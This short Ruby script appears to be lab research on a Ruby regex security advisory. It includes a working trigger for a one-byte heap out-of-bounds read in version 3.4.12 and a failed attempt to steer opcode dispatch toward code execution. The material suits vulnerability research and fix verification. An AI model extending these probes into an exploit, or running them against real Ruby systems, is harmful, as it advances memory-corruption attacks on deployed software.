#!/usr/bin/env ruby
# GHSA-wpqw-5qxg-m68r adjacent probes, UTF-32LE encoding.
#
# mode=steer INDEX: pattern (?i:w) + U+(INDEX<<8 | 0x03) + "AB", subject
#   U+1E98 + tail. Falsifies the UTF-16LE opcode-dispatch steering: the
#   compiled byte after the 'w' operand is OP_EXACTMBN (0x0d), the folded
#   subject byte there is 0x0a, and the comparison fails before NEXT.
#   Prediction was idx=0xINDEX dispatched at operand+8; observed bad=false
#   for every index on both builds.
#
# mode=exact CODEPOINT: pattern (?i:w) + U+CODEPOINT, subject U+1E98 +
#   U+CODEPOINT. 3.4.12 ASan reports a one-byte heap-buffer-overflow READ
#   in str_lower_case_match (regexec.c:4278) via bm_search_notrev_ic.
#   3.4.13 adds `if (tend - t < lowlen) return 0;` at that site and stays
#   clean. Distinct fix hunk from the match_at over-advance guard.
#
# Usage: ruby ruby2shell-wpqw-u32le.rb steer INDEX
#        ruby ruby2shell-wpqw-u32le.rb exact 0x03AB
# Never leave the lab.
$stdout.sync = true
enc = Encoding::UTF_32LE
mode = ARGV.fetch(0)

case mode
when 'steer'
  idx = Integer(ARGV.fetch(1)) & 0xff
  cp = (idx << 8) | 0x03
  tail = [cp].pack('U') + "AB"
  re = Regexp.new(("(?i:w)" + tail).encode(enc))
  good = ("w" + tail).encode(enc)
  bad  = ("\u1E98" + tail).encode(enc)
  puts "steer idx=0x%02x good=%s bad=%s" % [idx, re.match?(good), re.match?(bad)]
when 'exact'
  cp = Integer(ARGV.fetch(1)) & 0x1fffff
  tail = [cp].pack('U')
  re = Regexp.new(("(?i:w)" + tail).encode(enc))
  good = ("w" + tail).encode(enc)
  bad  = ("\u1E98" + tail).encode(enc)
  puts "exact cp=U+%04X good=%s" % [cp, re.match?(good)]
  puts "exact cp=U+%04X bad=%s"  % [cp, re.match?(bad)]
else
  abort "unknown mode: #{mode}"
end
